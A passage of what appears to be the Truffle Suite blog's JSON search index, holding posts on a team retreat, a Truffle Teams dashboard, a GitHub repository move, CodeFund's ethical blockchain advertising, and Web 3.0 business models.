our personal relationships in a way you don\u2019t get when working 100% remotely. We\u2019ll definitely be making retreats a recurring part of working at Truffle. Now that we\u2019re all back to work as usual, we\u2019ve already taken the results of the retreat to heart. We\u2019ve implemented our new development processes (info to come soon); revamped our products and offerings to be more in line with each other; have been settling into our new roles amazingly, and with little conflict; and overall we\u2019ve been having a great time. There are a few things I want to make sure I remember coming out of this retreat: You can build more of a relationship with someone in 10 minutes in person than you can in 3 months on Slack. I want to maintain this momentum and rapport. We\u2019ve found that video calls are the closest you can get on a 100% remote team. Going forward, we\u2019re now having one-on-one meetings every week to make sure we can keep up our rapport and ensure we\u2019re giving each other consistent, useful feedback. The right processes and structures are the basis for responsibility, autonomy, and trust between teammates. During the retreat we collectively decided on rules and structure that would help us work better together. These rules were meant to increase responsibility and autonomy and provide a basis of trust in decision-making where each of us are responsible for our own individual specialties. I want to increase this trust and know that each team member can make the right decisions when needed. Building rapport with your teammates is worth the effort. In a remote team you don\u2019t often get the chance to invite your coworker over for dinner or go to a local event. Bridging this gap is hard, and requires conscious effort, but has so many benefits including happiness, morale and general enthusiasm toward coming into work every day. I want to continue to bridge this gap and foster a culture where even if we\u2019re a thousand miles away, we can still feel close enough to have each other over for dinner. Final thought: I\u2019d eat Nick\u2019s caprese salad and Josh\u2019s sirloin medallions any day of the week.","title":"Going Home"},{"location":"blog/get-a-birds-eye-view-with-truffle-teams-new-dashboard/index.html","text":"As the operational needs of your dapp grow in complexity, it helps to be able to choose an area of focus. More incoming data begets a greater need to gain insights and properly segment that data to prevent overload. Wouldn\u2019t it be nice to see an overview of a particular deployed instance of your application with the ability to drill down into the parts you need to see in more detail? This is where the dashboard comes in! \ud83d\udcac The Dashboard feature could expand in many different directions and we need your help to prioritize what matters most for your dapps. In that spirit we\u2019ve released this first version quickly to get the conversation started. Please comment in the Truffler Slack workspace , email us , reach out any way you can--we\u2019re excited to hear from you. We first asked ourselves \u201cwhat is a dashboard\u201d? and surprisingly, got many different answers! We arrived at this definition: A dashboard is a place to see an overview of your application, along with ways to drill down and get further context on more narrow slices. The first release focuses mostly on the high-level, but we plan to increase the drilldown capabilities as the feature evolves. A Bird\u2019s Eye View \u00b6 The dashboard page with a deployment selected In this first version of the dashboard, you can pin a deployment for quick insights and visualization. Some of this information we haven\u2019t surfaced before, such as the deployment\u2019s cost and the number of unique addresses interacting with a deployment\u2019s contracts. CHECK OUT THE NEW DASHBOARD Looking Ahead \u00b6 Here\u2019s a bit of a teaser for you to get an idea of where this is going: A filter option to specify exactly which contracts are being displayed in the transaction graph A list of contracts providing the ability to hop into monitoring a specific contract instance or... Quickly interact with those contracts via our upcoming Contract Manager We strive for Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLE SLACK COMMUNITY Thanks! Josh Quintal, Head of Product & Marketing","title":"Get a Bird's Eye View with Truffle Teams' New Dashboard"},{"location":"blog/get-a-birds-eye-view-with-truffle-teams-new-dashboard/index.html#a-birds-eye-view","text":"The dashboard page with a deployment selected In this first version of the dashboard, you can pin a deployment for quick insights and visualization. Some of this information we haven\u2019t surfaced before, such as the deployment\u2019s cost and the number of unique addresses interacting with a deployment\u2019s contracts. CHECK OUT THE NEW DASHBOARD","title":"A Bird\u2019s Eye View"},{"location":"blog/get-a-birds-eye-view-with-truffle-teams-new-dashboard/index.html#looking-ahead","text":"Here\u2019s a bit of a teaser for you to get an idea of where this is going: A filter option to specify exactly which contracts are being displayed in the transaction graph A list of contracts providing the ability to hop into monitoring a specific contract instance or... Quickly interact with those contracts via our upcoming Contract Manager We strive for Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLE SLACK COMMUNITY Thanks! Josh Quintal, Head of Product & Marketing","title":"Looking Ahead"},{"location":"blog/github-repository-moved/index.html","text":"We recently released Truffle 3.0 in February to much fanfare . As part of that release we separated our codebase into multiple different modules to make integrating with Truffle easier. Those modules now live in the github repository http://github.com/trufflesuite , which hints at our broader mission of providing a comprehensive suite of tools for Ethereum development. But something was missing... \u00b6 We forgot Truffle! The main Truffle repository -- including the Truffle command line tool -- remained at it's old Consensys location while its modules hung out at their new digs. We thought to ourselves: That just wouldn't do. So, as matter of announcement, Truffle has officially moved. It's new home is http://github.com/trufflesuite . Wait, there's more. \u00b6 The Truffle Suite repository will soon be filling up with more open-source tools to make your Ethereum development life easier. We're not ready to announce what those are yet, but stay tuned for some awesome announcements in the coming weeks. While you're here. \u00b6 While we're announcing things, we should let you know we have a new Twitter account: @trufflesuite . Feel free to reach out to use there for all your Truffle needs. Au revoir for now! -- Tim","title":"We've moved our github repo!"},{"location":"blog/github-repository-moved/index.html#but-something-was-missing","text":"We forgot Truffle! The main Truffle repository -- including the Truffle command line tool -- remained at it's old Consensys location while its modules hung out at their new digs. We thought to ourselves: That just wouldn't do. So, as matter of announcement, Truffle has officially moved. It's new home is http://github.com/trufflesuite .","title":"But something was missing..."},{"location":"blog/github-repository-moved/index.html#wait-theres-more","text":"The Truffle Suite repository will soon be filling up with more open-source tools to make your Ethereum development life easier. We're not ready to announce what those are yet, but stay tuned for some awesome announcements in the coming weeks.","title":"Wait, there's more."},{"location":"blog/github-repository-moved/index.html#while-youre-here","text":"While we're announcing things, we should let you know we have a new Twitter account: @trufflesuite . Feel free to reach out to use there for all your Truffle needs. Au revoir for now! -- Tim","title":"While you're here."},{"location":"blog/how-ethical-advertising-will-transform-the-blockchain-industry/index.html","text":"CodeFund is an ethical ad platform that funds contributors to the open source ecosystem. Visit CodeFund to learn more and apply. The Conflicting Relationship Between Blockchain and Marketing \u00b6 In the initial years following Bitcoin\u2019s inception, most blockchain companies didn\u2019t need paid advertising. The early adopters were a community of cypherpunks, libertarians, developers, miners, and hobbyists, that truly believed in the power of decentralized networks. To them, adoption was inevitable, and rather than putting paid ads in front of the general public, resources were better spent building wallets, development tools, infrastructure, and scalability solutions. Additionally, almost all early blockchain users and entrepreneurs were extremely privacy-conscious. Pseudonymity is a key component to cryptocurrencies, they wouldn\u2019t work in a permissionless manner without it. The Adtech industry, on the other hand, is run by monolithic centralized powerhouses that gather and store immense amounts of personal data for precise targeting. For the first 5 years of Bitcoin, the blockchain community ethos was quite literally the polar opposite of the advertising industry . That\u2019s not to say that in the early days exchanges, wallets, and other blockchain services were unable to run successful marketing campaigns. However, the community was generally so niche that most users had a good sense of what they were looking for. The famous cliche, \u201cIf you build it, they will come\u201d is frequently repeated in this space. While it was arguably true for Bitcoin, the internet, and certain decentralized protocols, the data shows that marketing is often crucial for launching a business or community built on top of these networks. Following the launch of Ethereum, the rise of smart contracts, and the ICO mania, things changed. All of a sudden it was relatively easy for startups to launch their own token and rake in millions with a whitepaper. As a result, marketing budgets began to skyrocket and paid campaigns were everywhere due to the (seemingly) huge potential for capital accumulation. While some genuinely revolutionary ideas were started and funded during this time, the vast majority were subpar projects and outright fraudulent scams preying on naive users. At one point Coinmarketcap , a fairly well-regarded website in the crypto space, was showing ads for Bitconnect , a known Ponzi scheme. As a result, most mainstream ad providers like Google and Facebook banned all ads pertaining to crypto. Some people in the blockchain industry thought this was unfair, but it was for good reason. Scammy projects were ruining the public perception of blockchain technology. However, reputable companies were also caught in the crossfire, finding it increasingly difficult to advertise their projects. Notably, Mailchimp\u2019s blockchain ban impacted a project I was working on along with plenty of other startups. I remember when Evan Van Ness \u2019 twitter and Week in Ethereum newsletter (my favorite Ethereum educational resource) were shut down multiple times . So, what\u2019s the solution? Fortunately, the majority of mainstream advertising services have relaxed their bans on blockchain advertising in the face of a maturing ecosystem. This is especially interesting when considering that both Google and Facebook have announced their foray into the industry. Existing Blockchain Advertising Obstacles \u00b6 We recently released a blog post covering a variety of different free and paid channels to advertise your blockchain startup. And although there are more options than ever, there are still several obstacles to overcome. As we appear to be approaching the next bull market, scams will undoubtedly come back (I\u2019ve already seen a huge uptick in the \u201cfree crypto\u201d scams on twitter). Further, the crypto ecosystem hasn\u2019t addressed the problems of mass data collection and rampant user profiling in the Adtech world. Most of us believe blockchain will be the catalyst for a revolution of privacy and self-sovereign identity, hopefully breaking up the big data monopolies of web2. Yet the entrepreneurs and thought leaders pushing this narrative of individual autonomy and privacy in the digital age are still using advertising services that track, profile, and collect mass amounts of data from their target markets. Marketing is inevitable - startups need to reach their desired audience and grow a user base. But can this be done in a more ethical way, in line with the ethos of this technology we love and support? Enter: CodeFund \u00b6 While all of this craziness was happening in the blockchain world, Eric Berry was focused on tackling a different problem: The Open Source Conundrum . Open source software lays the foundation for the Internet as we know it and supports so much of our global business processes, yet comparatively receives very little support and funding. How can we help open source projects and maintainers get consistent financial support? Eric founded Code Sponsor 2 years ago , allowing companies to place small text-based sponsored messages on GitHub project READMEs to support open source software. Since then he\u2019s been threatened with legal action, shut down, started again, rebranded to CodeFund, and eventually joined the Gitcoin team at ConsenSys , who share the same mission: get developers paid . At CodeFund , we pride ourselves on showing ethical ads on developer websites, acknowledging and respecting individual privacy. This means that our ads do not track, use cookies, nor collect any data except for IP addresses and browser agents. We feel ads that track our browsing history and know our personal information are an invasion of privacy, and from our research, the majority of our user base feels the same way. So while we can't profile and target specific demographics and individuals, we can help you tailor your ads to the desired audience and display them on sites that your audience frequents with geotargeting. Users will see ads that they actually want to see without compromising their data, browsing history, or personal information. CodeFund is 100% open source (feel free to contribute! \ud83d\ude04) and was built by developers for developers, so we understand the motivations of our users. We keep our content relevant by only showing high-quality ads from companies that are of interest to the audience. We diligently vet all advertisers and publishers to make sure they are a good fit for the network. By understanding the community and showing them ads relevant to their interests, you build trust between your advertisers, publishers, and most importantly, users. The CodeFund model is a bit unorthodox in the Adtech world. However, we find it to be extremely successful in our niche (and growing) open source community. Developers are typically much more likely to use ad blockers compared to typical Internet users. Developers are also known to be more concerned about privacy and data collection. For these reasons, they can often be hard to reach with advertising. To get your message seen, you need reputable publishers who are trusted by their audience. CodeFund is bound by the standards set by acceptable ads , which means many ad blockers do not block us. We work with our users to allow our ads and make sure they are relevant to the audience, ensuring all parties involved are benefiting. We believe the future of the web will be a privacy-focused, user-driven evolution . More scandals are emerging from large corporations revealing data mismanagement, leaks, and hacks of sensitive information. Digital advertising will never go away, but the average internet user is becoming more security and privacy conscious, and we think this will lead to an increased demand for ethical advertising products. That's why we built a platform to allow advertisers to get their message to the right audience without compromising user integrity. Ethical Ads for Blockchain - Why Target Crypto Users? \u00b6 Initially CodeFund was not focused on the blockchain space, however, since joining Gitcoin , we\u2019ve been expanding our offerings. We realized that ethical advertising is going to play a crucial role in Web3, blockchain, open source, and the future of the Internet - and that's something we want to support. Blockchain technology was undeniably born out of the open source ecosystem. While the two communities are not exactly the same, they share many morals and have significant overlap. By nature, blockchain and cryptocurrencies would be useless if they were not open source. A key feature of decentralized cryptocurrencies is that there is no need to trust an intermediary and no barriers to entry. For it to work, anyone must be able to run, review, and contribute to the code. Today's leading blockchains are a cumulation of hundreds, if not thousands of individuals contributing to open source code bases. Just like most developers, blockchain users and enthusiasts tend to be much more privacy conscious than a typical Internet user. As a result, CodeFund's ethical ad model is a great fit, not only for blockchain developers but also for blockchain users. CodeFund ensures that the blockchain projects we work with are building applications and tools for open source blockchains, primarily for Ethereum. We don\u2019t work with projects pumping their own token sales, instead, we partner with blockchain companies that are adding value to society and the open source ecosystem . CodeFund\u2019s Blockchain Offerings \u00b6 For the next few months, CodeFund will be actively building out our blockchain publisher and advertiser networks. We are currently publishing ads on Etherscan , State of the Dapps , Etherchain , Decrypt Media , Coingecko , and a handful of other high-quality blockchain websites - with even more in the pipeline. Decrypt just release a great piece on the problems with crypto \u201cnews\u201d sites, and their motivations for advertising ethically. Our advertisers like Truffle are happy with their results so far and have seen high conversion rates from their campaigns, without sacrificing the privacy and integrity of their audience. Crypto markets are beginning to turn around, more startups are shipping products, and the global blockchain community is growing. We expect this trend to continue, driving the demand for blockchain advertising as a result. Many blockchain websites publishing ads see it as a necessary evil \u2013 they need to keep the lights on to continue providing their services, but feel their choices are limited. The first option is working with companies to run direct advertising campaigns. However, this approach consumes time and resources and can be risky if advertisers pull out. The second option, and perhaps the easiest, is to use Google Ads or another incumbent service. Using this approach, many feel they\u2019re compromising users\u2019 privacy and trust. Moreover, outsourcing to huge Adtech giants is part of the problem that made ICO scams so rampant in 2018-2019. These companies simply have far too much traffic and lack the specialized skill set required to manually vet every single advertiser and identify blockchain scams. The last thing publishers want on their website is an ad that loses your users' money or promotes the purchasing of unregistered securities. At Gitcoin and CodeFund, we are a small team that has been in the blockchain world for years. We view every publisher and advertiser as a partner, diligently vet them, and hold them to the highest standards. We\u2019d like to see ethical advertising become the new standard in the blockchain space, and eventually on the Internet as a whole. If your blockchain company is interested in advertising to a high-quality audience, or you would like to earn passive income showing relevant ads on your website without sacrificing your community\u2019s privacy, CodeFund is for you! Apply now on the CodeFund landing page and we\u2019ll be in touch, or reach out to connor@codefund.io for more information.","title":"How Ethical Advertising Will Transform the Blockchain Industry"},{"location":"blog/how-ethical-advertising-will-transform-the-blockchain-industry/index.html#the-conflicting-relationship-between-blockchain-and-marketing","text":"In the initial years following Bitcoin\u2019s inception, most blockchain companies didn\u2019t need paid advertising. The early adopters were a community of cypherpunks, libertarians, developers, miners, and hobbyists, that truly believed in the power of decentralized networks. To them, adoption was inevitable, and rather than putting paid ads in front of the general public, resources were better spent building wallets, development tools, infrastructure, and scalability solutions. Additionally, almost all early blockchain users and entrepreneurs were extremely privacy-conscious. Pseudonymity is a key component to cryptocurrencies, they wouldn\u2019t work in a permissionless manner without it. The Adtech industry, on the other hand, is run by monolithic centralized powerhouses that gather and store immense amounts of personal data for precise targeting. For the first 5 years of Bitcoin, the blockchain community ethos was quite literally the polar opposite of the advertising industry . That\u2019s not to say that in the early days exchanges, wallets, and other blockchain services were unable to run successful marketing campaigns. However, the community was generally so niche that most users had a good sense of what they were looking for. The famous cliche, \u201cIf you build it, they will come\u201d is frequently repeated in this space. While it was arguably true for Bitcoin, the internet, and certain decentralized protocols, the data shows that marketing is often crucial for launching a business or community built on top of these networks. Following the launch of Ethereum, the rise of smart contracts, and the ICO mania, things changed. All of a sudden it was relatively easy for startups to launch their own token and rake in millions with a whitepaper. As a result, marketing budgets began to skyrocket and paid campaigns were everywhere due to the (seemingly) huge potential for capital accumulation. While some genuinely revolutionary ideas were started and funded during this time, the vast majority were subpar projects and outright fraudulent scams preying on naive users. At one point Coinmarketcap , a fairly well-regarded website in the crypto space, was showing ads for Bitconnect , a known Ponzi scheme. As a result, most mainstream ad providers like Google and Facebook banned all ads pertaining to crypto. Some people in the blockchain industry thought this was unfair, but it was for good reason. Scammy projects were ruining the public perception of blockchain technology. However, reputable companies were also caught in the crossfire, finding it increasingly difficult to advertise their projects. Notably, Mailchimp\u2019s blockchain ban impacted a project I was working on along with plenty of other startups. I remember when Evan Van Ness \u2019 twitter and Week in Ethereum newsletter (my favorite Ethereum educational resource) were shut down multiple times . So, what\u2019s the solution? Fortunately, the majority of mainstream advertising services have relaxed their bans on blockchain advertising in the face of a maturing ecosystem. This is especially interesting when considering that both Google and Facebook have announced their foray into the industry.","title":"The Conflicting Relationship Between Blockchain and Marketing"},{"location":"blog/how-ethical-advertising-will-transform-the-blockchain-industry/index.html#existing-blockchain-advertising-obstacles","text":"We recently released a blog post covering a variety of different free and paid channels to advertise your blockchain startup. And although there are more options than ever, there are still several obstacles to overcome. As we appear to be approaching the next bull market, scams will undoubtedly come back (I\u2019ve already seen a huge uptick in the \u201cfree crypto\u201d scams on twitter). Further, the crypto ecosystem hasn\u2019t addressed the problems of mass data collection and rampant user profiling in the Adtech world. Most of us believe blockchain will be the catalyst for a revolution of privacy and self-sovereign identity, hopefully breaking up the big data monopolies of web2. Yet the entrepreneurs and thought leaders pushing this narrative of individual autonomy and privacy in the digital age are still using advertising services that track, profile, and collect mass amounts of data from their target markets. Marketing is inevitable - startups need to reach their desired audience and grow a user base. But can this be done in a more ethical way, in line with the ethos of this technology we love and support?","title":"Existing Blockchain Advertising Obstacles"},{"location":"blog/how-ethical-advertising-will-transform-the-blockchain-industry/index.html#enter-codefund","text":"While all of this craziness was happening in the blockchain world, Eric Berry was focused on tackling a different problem: The Open Source Conundrum . Open source software lays the foundation for the Internet as we know it and supports so much of our global business processes, yet comparatively receives very little support and funding. How can we help open source projects and maintainers get consistent financial support? Eric founded Code Sponsor 2 years ago , allowing companies to place small text-based sponsored messages on GitHub project READMEs to support open source software. Since then he\u2019s been threatened with legal action, shut down, started again, rebranded to CodeFund, and eventually joined the Gitcoin team at ConsenSys , who share the same mission: get developers paid . At CodeFund , we pride ourselves on showing ethical ads on developer websites, acknowledging and respecting individual privacy. This means that our ads do not track, use cookies, nor collect any data except for IP addresses and browser agents. We feel ads that track our browsing history and know our personal information are an invasion of privacy, and from our research, the majority of our user base feels the same way. So while we can't profile and target specific demographics and individuals, we can help you tailor your ads to the desired audience and display them on sites that your audience frequents with geotargeting. Users will see ads that they actually want to see without compromising their data, browsing history, or personal information. CodeFund is 100% open source (feel free to contribute! \ud83d\ude04) and was built by developers for developers, so we understand the motivations of our users. We keep our content relevant by only showing high-quality ads from companies that are of interest to the audience. We diligently vet all advertisers and publishers to make sure they are a good fit for the network. By understanding the community and showing them ads relevant to their interests, you build trust between your advertisers, publishers, and most importantly, users. The CodeFund model is a bit unorthodox in the Adtech world. However, we find it to be extremely successful in our niche (and growing) open source community. Developers are typically much more likely to use ad blockers compared to typical Internet users. Developers are also known to be more concerned about privacy and data collection. For these reasons, they can often be hard to reach with advertising. To get your message seen, you need reputable publishers who are trusted by their audience. CodeFund is bound by the standards set by acceptable ads , which means many ad blockers do not block us. We work with our users to allow our ads and make sure they are relevant to the audience, ensuring all parties involved are benefiting. We believe the future of the web will be a privacy-focused, user-driven evolution . More scandals are emerging from large corporations revealing data mismanagement, leaks, and hacks of sensitive information. Digital advertising will never go away, but the average internet user is becoming more security and privacy conscious, and we think this will lead to an increased demand for ethical advertising products. That's why we built a platform to allow advertisers to get their message to the right audience without compromising user integrity.","title":"Enter: CodeFund"},{"location":"blog/how-ethical-advertising-will-transform-the-blockchain-industry/index.html#ethical-ads-for-blockchain-why-target-crypto-users","text":"Initially CodeFund was not focused on the blockchain space, however, since joining Gitcoin , we\u2019ve been expanding our offerings. We realized that ethical advertising is going to play a crucial role in Web3, blockchain, open source, and the future of the Internet - and that's something we want to support. Blockchain technology was undeniably born out of the open source ecosystem. While the two communities are not exactly the same, they share many morals and have significant overlap. By nature, blockchain and cryptocurrencies would be useless if they were not open source. A key feature of decentralized cryptocurrencies is that there is no need to trust an intermediary and no barriers to entry. For it to work, anyone must be able to run, review, and contribute to the code. Today's leading blockchains are a cumulation of hundreds, if not thousands of individuals contributing to open source code bases. Just like most developers, blockchain users and enthusiasts tend to be much more privacy conscious than a typical Internet user. As a result, CodeFund's ethical ad model is a great fit, not only for blockchain developers but also for blockchain users. CodeFund ensures that the blockchain projects we work with are building applications and tools for open source blockchains, primarily for Ethereum. We don\u2019t work with projects pumping their own token sales, instead, we partner with blockchain companies that are adding value to society and the open source ecosystem .","title":"Ethical Ads for Blockchain - Why Target Crypto Users?"},{"location":"blog/how-ethical-advertising-will-transform-the-blockchain-industry/index.html#codefunds-blockchain-offerings","text":"For the next few months, CodeFund will be actively building out our blockchain publisher and advertiser networks. We are currently publishing ads on Etherscan , State of the Dapps , Etherchain , Decrypt Media , Coingecko , and a handful of other high-quality blockchain websites - with even more in the pipeline. Decrypt just release a great piece on the problems with crypto \u201cnews\u201d sites, and their motivations for advertising ethically. Our advertisers like Truffle are happy with their results so far and have seen high conversion rates from their campaigns, without sacrificing the privacy and integrity of their audience. Crypto markets are beginning to turn around, more startups are shipping products, and the global blockchain community is growing. We expect this trend to continue, driving the demand for blockchain advertising as a result. Many blockchain websites publishing ads see it as a necessary evil \u2013 they need to keep the lights on to continue providing their services, but feel their choices are limited. The first option is working with companies to run direct advertising campaigns. However, this approach consumes time and resources and can be risky if advertisers pull out. The second option, and perhaps the easiest, is to use Google Ads or another incumbent service. Using this approach, many feel they\u2019re compromising users\u2019 privacy and trust. Moreover, outsourcing to huge Adtech giants is part of the problem that made ICO scams so rampant in 2018-2019. These companies simply have far too much traffic and lack the specialized skill set required to manually vet every single advertiser and identify blockchain scams. The last thing publishers want on their website is an ad that loses your users' money or promotes the purchasing of unregistered securities. At Gitcoin and CodeFund, we are a small team that has been in the blockchain world for years. We view every publisher and advertiser as a partner, diligently vet them, and hold them to the highest standards. We\u2019d like to see ethical advertising become the new standard in the blockchain space, and eventually on the Internet as a whole. If your blockchain company is interested in advertising to a high-quality audience, or you would like to earn passive income showing relevant ads on your website without sacrificing your community\u2019s privacy, CodeFund is for you! Apply now on the CodeFund landing page and we\u2019ll be in touch, or reach out to connor@codefund.io for more information.","title":"CodeFund\u2019s Blockchain Offerings"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html","text":"Although the Internet continues to drive digital transformation, the technology operates far beyond its original parameters. Since its inception over two decades ago, the web has been subject to increasing levels of centralization and mass surveillance. As a result, large corporations, governments, and media outlets remain the primary beneficiaries of an infrastructure meant to serve all of humanity. Herein lies the problem with the current Internet ecosystem, also known as Web 2.0. In the current online environment, users continually function as commodities, generating value along with their data. And while large entities should not shoulder the blame for their role in our everyday lives, their control over our personal information is cause for concern. As Internet founder Tim Berners-Lee once said , \"for people who want to make sure the Web serves humanity, we have to concern ourselves with what people are building on top of it.\" It is precisely this sentiment that drives the Web 3.0 movement. And although blockchain technology may be the foundation of this movement, the initiative is much broader. Web 3.0 is about building a decentralized infrastructure that protects individual property and privacy. But what exactly does this look like and what are the potential implications? In this article, we'll explore the evolution of Internet infrastructure and how the arrival of Web 3.0 is impacting existing business models. The Evolution of Web Infrastructure \u00b6 The Internet debuted employing simplistic \"read-only\" technology, meaning users were only able to search for information and read it. This Web 1.0 environment was primarily intended for advertising purposes, acting as an extension of physical storefronts. With the arrival of \"read-write\" functionality, users of Web 2.0 are able to create their content and interact with the Internet in a far deeper capacity. By facilitating the prolific growth of social media platforms, blogs, and online reviews, this infrastructure continues to guide global business models. However, as mentioned, this era of robust growth has not come without consequences. Consumer protections continue to rank behind corporate interests as web surveillance fuels lucrative data collection. Continued data breaches effectively highlight the downside of this arrangement. In response to these challenges, Web 3.0 initiatives aim to put power back into the hands of users. But before exploring how this will occur, it's crucial to understand the specific Web 3.0 characteristics that will facilitate this process. Characteristics of Web 3.0 \u00b6 Although Web 3.0 is difficult to define in exact terms, it can be effectively broken down into unique components. Semantic Web \u00b6 The semantic web improves upon existing web infrastructure by generating, sharing, and connecting content based on an understanding of words. Rather than relying on keywords and numbers, search and analysis utilize context. Source: The Semantic Web Stack Connectivity Thanks to semantic metadata, Web 3.0 achieves greater connectivity. By leveraging all available information, the user experience dramatically improves. Artificial Intelligence \u00b6 Web 3.0 technology can process information in a way similar to humans. As a result, platforms can better satisfy user needs through continuous learning. 3D Capabilities \u00b6 Three-dimensional design is already in use on many Web 3.0 platforms. Computer games, e-commerce applications, and mapping software represent only a few potential use cases. Ubiquitous \u00b6 In the decentralized Web 3.0 environment, all content is accessible by multiple applications, every device connects to the web, and the associated services are available everywhere. Web 3.0 and Existing Business Models \u00b6 Although we have only just begun to explore the potential of Web 3.0 applications, their ability to upset the status-quo is undeniable. Of particular interest to many is how decentralized projects, operating in traditional industries, will up-end conventional revenue models. Through utilizing distributed, peer-to-peer platforms, some industries have begun to consider other funding options. Although there is a vast array of revenue models to consider, we\u2019ll explore some of the most prominent options here. To see the full list, check out the Github repository . Revenue Share \u00b6 The revenue share model uses profits to enable separate actors to develop efficiencies or innovate in mutually beneficial ways, such as splitting earnings. Percentage Fee \u00b6 This model is where you take a percentage of each transaction executed on your platform. It remains a popular model with exchanges and marketplaces. The seller usually pays for the fee since they're the one that benefits from completing a sale on the platform. Income Share \u00b6 Using this model, users share earnings from another entity. An offline example would be a restaurant where the cashier shares the tips with everyone. In the context of Web 3.0, you could give a one-dollar tip in a coffee shop and split it with every actor in the coffee value chain with minimal transaction costs. ICO\u2019s \u00b6 Conducting an ICO is the process of selling project tokens all at once, or over some time. There are several ICO models and token variations that companies can use to raise funds. Continuous Funding Models \u00b6 Continuous Funding Models are business models that sell ERC-20 tokens over time, rather than all at once. Curved Bonding \u00b6 Curved Bonding is a method of continuous funding that incentivizes early investment. In contrast to conventional ERC-20 token sales and ICO's, which feature each token being sold for the same price (no matter the time of purchase), such models hardcode buy prices according to an algorithmic curve. By purchasing early, investors get more tokens for the same price than if they are buying later. Ultimately, using Curved Bonding incentivizes early adopters to invest in a token. Continuous Organizations \u00b6 A continuous organization is one that sets up a Decentralized Autonomous Trust (DAT). This trust is an immutable smart-contract that implements curve bonding to automatically mint, burn, and distribute security tokens called FAIR securities. Organizations provide value to the trust by diverting part or all of their cash flow to it. Streaming Money \u00b6 Side Channels \u00b6 A sidechain is a separate blockchain that is attached to its parent blockchain using a two-way peg. Using this model, you can move assets to the sidechain and then back to the parent chain. However, sidechains also need their miners. These miners receive an incentive through 'merged mining,' whereby two separate cryptocurrencies, based on the same algorithm, are mined simultaneously. State Channels \u00b6 State channels are mostly two-way pathways open between two users that want to communicate with each other in the form of transactions. Here, only the outcome needs to be included in the form of a single transaction on the main chain. Other transactions occur on off-chain. The Future of Internet Infrastructure \u00b6 As the development of Web 3.0 technology persists, blockchain technology will remain a vital component of online infrastructure. Although the world continues to benefit from the transformative power of the web, user empowerment remains a priority among a growing segment of society. In a time when centralized institutions and governments exert control over personal data, many have begun to challenge the status quo. Those exploring this emerging subset of the web are well-positioned to benefit from growing momentum. By leveraging Web 3.0 technologies, companies also have the ability to enact new, potentially lucrative business models. Regardless of the industry, the new web presents an opportunity to pivot from traditional revenue streams in search of more optimal solutions. In the midst of ongoing innovation, it\u2019s important to note that all new technology requires refinement - and Web 3.0 is only just beginning.","title":"How the Arrival of Web 3.0 is Transforming Traditional Business Models"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#the-evolution-of-web-infrastructure","text":"The Internet debuted employing simplistic \"read-only\" technology, meaning users were only able to search for information and read it. This Web 1.0 environment was primarily intended for advertising purposes, acting as an extension of physical storefronts. With the arrival of \"read-write\" functionality, users of Web 2.0 are able to create their content and interact with the Internet in a far deeper capacity. By facilitating the prolific growth of social media platforms, blogs, and online reviews, this infrastructure continues to guide global business models. However, as mentioned, this era of robust growth has not come without consequences. Consumer protections continue to rank behind corporate interests as web surveillance fuels lucrative data collection. Continued data breaches effectively highlight the downside of this arrangement. In response to these challenges, Web 3.0 initiatives aim to put power back into the hands of users. But before exploring how this will occur, it's crucial to understand the specific Web 3.0 characteristics that will facilitate this process.","title":"The Evolution of Web Infrastructure"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#characteristics-of-web-30","text":"Although Web 3.0 is difficult to define in exact terms, it can be effectively broken down into unique components.","title":"Characteristics of Web 3.0"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#semantic-web","text":"The semantic web improves upon existing web infrastructure by generating, sharing, and connecting content based on an understanding of words. Rather than relying on keywords and numbers, search and analysis utilize context. Source: The Semantic Web Stack Connectivity Thanks to semantic metadata, Web 3.0 achieves greater connectivity. By leveraging all available information, the user experience dramatically improves.","title":"Semantic Web"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#artificial-intelligence","text":"Web 3.0 technology can process information in a way similar to humans. As a result, platforms can better satisfy user needs through continuous learning.","title":"Artificial Intelligence"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#3d-capabilities","text":"Three-dimensional design is already in use on many Web 3.0 platforms. Computer games, e-commerce applications, and mapping software represent only a few potential use cases.","title":"3D Capabilities"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#ubiquitous","text":"In the decentralized Web 3.0 environment, all content is accessible by multiple applications, every device connects to the web, and the associated services are available everywhere.","title":"Ubiquitous"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#web-30-and-existing-business-models","text":"Although we have only just begun to explore the potential of Web 3.0 applications, their ability to upset the status-quo is undeniable. Of particular interest to many is how decentralized projects, operating in traditional industries, will up-end conventional revenue models. Through utilizing distributed, peer-to-peer platforms, some industries have begun to consider other funding options. Although there is a vast array of revenue models to consider, we\u2019ll explore some of the most prominent options here. To see the full list, check out the Github repository .","title":"Web 3.0 and Existing Business Models"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#revenue-share","text":"The revenue share model uses profits to enable separate actors to develop efficiencies or innovate in mutually beneficial ways, such as splitting earnings.","title":"Revenue Share"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#percentage-fee","text":"This model is where you take a percentage of each transaction executed on your platform. It remains a popular model with exchanges and marketplaces. The seller usually pays for the fee since they're the one that benefits from completing a sale on the platform.","title":"Percentage Fee"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#income-share","text":"Using this model, users share earnings from another entity. An offline example would be a restaurant where the cashier shares the tips with everyone. In the context of Web 3.0, you could give a one-dollar tip in a coffee shop and split it with every actor in the coffee value chain with minimal transaction costs.","title":"Income Share"},{"location":"blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/index.html#icos","text":"Conducting an ICO is the process of selling project tokens all at once, or over some time. There are several ICO models and token variations that companies can use to raise 